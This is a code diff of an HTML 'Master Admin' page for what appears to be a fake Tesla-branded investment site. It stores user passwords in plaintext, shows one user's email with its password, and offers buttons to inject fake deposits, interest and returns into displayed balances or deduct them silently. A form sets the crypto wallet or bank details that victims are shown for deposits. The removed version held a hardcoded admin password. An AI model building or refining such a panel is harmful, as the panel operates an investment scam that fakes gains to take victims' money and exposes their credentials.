@@ -2,61 +2,97 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Tesla Base | Master Admin</title>
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        body { background:#000; color:#fff; font-family:sans-serif; padding:20px; }
-        .locked { display:flex; flex-direction:column; align-items:center; justify-content:center; height:80vh; }
-        .card { background:#111; padding:20px; border-radius:10px; margin-bottom:15px; border:1px solid #e31937; }
-        table { width:100%; border-collapse:collapse; }
-        th, td { padding:10px; border:1px solid #222; text-align:left; }
+        :root { --bg: #000; --card: #111; --tesla-red: #E31937; --text: #fff; --gray: #8e8e8e; --border: #1f1f1f; }
+        body { background: var(--bg); color: var(--text); font-family: -apple-system, sans-serif; padding: 20px; }
+        .box { border: 1px solid var(--tesla-red); border-radius: 12px; padding: 20px; margin-bottom: 25px; background: var(--card); }
+        h2 { font-size: 18px; margin-bottom: 20px; text-transform: uppercase; letter-spacing: 1px; }
+        table { width: 100%; border-collapse: collapse; font-size: 13px; }
+        th { color: var(--gray); text-align: left; padding: 10px; border-bottom: 1px solid var(--border); }
+        td { padding: 12px 10px; border-bottom: 1px solid var(--border); }
+        input, select { background: #fff; border: none; padding: 10px; border-radius: 6px; width: 100%; margin-top: 8px; font-size: 14px; color: #000; }
+        .btn-group { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-top: 15px; }
+        .btn { padding: 12px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; color: #fff; transition: 0.3s; }
+        .btn-green { background: #28a745; }
+        .btn-yellow { background: #ffc107; color: #000; }
+        .btn-blue { background: #007bff; }
+        .btn-gray { background: #6c757d; }
+        .btn:active { transform: scale(0.98); }
     </style>
 </head>
 <body>
-    <div id="lock-screen" class="locked">
-        <h2 style="color:#e31937;">Admin Gateway</h2>
-        <input type="password" id="admin-pass" placeholder="Enter System Password" style="padding:12px; width:250px;">
-        <button onclick="checkPass()" style="margin-top:10px; padding:10px 30px; background:#e31937; border:none; color:white; cursor:pointer;">Enter</button>
+
+    <h1 style="color:var(--tesla-red); font-weight:900; margin-bottom:30px;">MASTER CONTROL</h1>
+
+    <div class="box">
+        <h2>User Passwords & Balances</h2>
+        <table>
+            <thead>
+                <tr><th>Email</th><th>Password</th><th>Balance</th></tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>sweetcsf1@gmail.com</td>
+                    <td style="color:var(--tesla-red); font-weight:bold;">222222</td>
+                    <td id="admin-view-bal" style="color:#28a745; font-weight:bold;">$0.00</td>
+                </tr>
+            </tbody>
+        </table>
     </div>
 
-    <div id="admin-content" style="display:none;">
-        <h1>Master Control</h1>
-        <div class="card">
-            <h3>User Passwords & Balances</h3>
-            <table id="user-table">
-                <tr><th>Email</th><th>Password</th><th>Balance</th><th>Action</th></tr>
-            </table>
-        </div>
-        <div class="card">
-            <h3>Inject/Deduct Funds</h3>
-            <input type="text" id="target" placeholder="User Email">
-            <input type="number" id="amt" placeholder="Amount">
-            <div style="margin-top:10px;">
-                <button onclick="inject('Deposit')" style="background:green; color:white;">Inject Deposit</button>
-                <button onclick="inject('Interest')" style="background:orange; color:black;">Inject Interest</button>
-                <button onclick="inject('Investment Return')" style="background:blue; color:white;">Inject Return</button>
-                <button onclick="inject('Deduct')" style="background:transparent; border:1px solid #333; color:#333;">Deduct (Silent)</button>
-            </div>
+    <div class="box">
+        <h2>Inject / Deduct Funds</h2>
+        <label>Amount (USD):</label>
+        <input type="number" id="inject-amount" placeholder="Enter amount (e.g. 5000)">
+        <div class="btn-group">
+            <button class="btn btn-green" onclick="updateFunds('add')">Inject Deposit</button>
+            <button class="btn btn-yellow" onclick="updateFunds('interest')">Inject Interest</button>
+            <button class="btn btn-blue" onclick="updateFunds('add')">Inject Return</button>
+            <button class="btn btn-gray" onclick="updateFunds('deduct')">Deduct (Silent)</button>
         </div>
     </div>
 
-    <script src="app.js"></script>
+    <div class="box">
+        <h2>Deposit Details Setup</h2>
+        <label>Payment Method Name:</label>
+        <input type="text" id="method-name" placeholder="e.g. Bitcoin (BTC) or Bank Name">
+        <label style="display:block; margin-top:15px;">Wallet Address / Bank Info:</label>
+        <input type="text" id="method-info" placeholder="Paste Wallet Address or Bank Details">
+        <button class="btn btn-blue" style="width:100%; margin-top:20px;" onclick="savePayment()">Update User Deposit Page</button>
+    </div>
+
     <script>
-        function checkPass() {
-            if(document.getElementById('admin-pass').value === 'SOLOMON200') {
-                document.getElementById('lock-screen').style.display = 'none';
-                document.getElementById('admin-content').style.display = 'block';
-                loadUsers();
-            } else { alert("Access Denied."); }
+        function updateFunds(action) {
+            const amount = parseFloat(document.getElementById('inject-amount').value);
+            if (isNaN(amount)) return alert("Please enter a valid amount.");
+            
+            let current = parseFloat(localStorage.getItem('userBalance')) || 0;
+            if (action === 'deduct') current -= amount;
+            else current += amount;
+
+            localStorage.setItem('userBalance', current.toFixed(2));
+            render();
+            alert("Balance updated to: $" + current.toLocaleString());
         }
-        async function loadUsers() {
-            const { data } = await _supabase.from('profiles').select('*');
-            const t = document.getElementById('user-table');
-            data.forEach(u => {
-                t.innerHTML += `<tr><td>${u.email}</td><td style="color:#ffd700;">${u.password}</td><td>$${u.balance}</td><td><button onclick="document.getElementById('target').value='${u.email}'">Select</button></td></tr>`;
-            });
+
+        function savePayment() {
+            const name = document.getElementById('method-name').value;
+            const info = document.getElementById('method-info').value;
+            if (!name || !info) return alert("Fill both fields.");
+            
+            localStorage.setItem('dep_name', name);
+            localStorage.setItem('dep_info', info);
+            alert("User deposit page updated successfully!");
         }
-        // Admin financial logic handles the 3 distinct inject types here...
+
+        function render() {
+            const bal = localStorage.getItem('userBalance') || "0.00";
+            document.getElementById('admin-view-bal').innerText = "$" + parseFloat(bal).toLocaleString();
+        }
+        window.onload = render;
     </script>
 </body>
 </html>
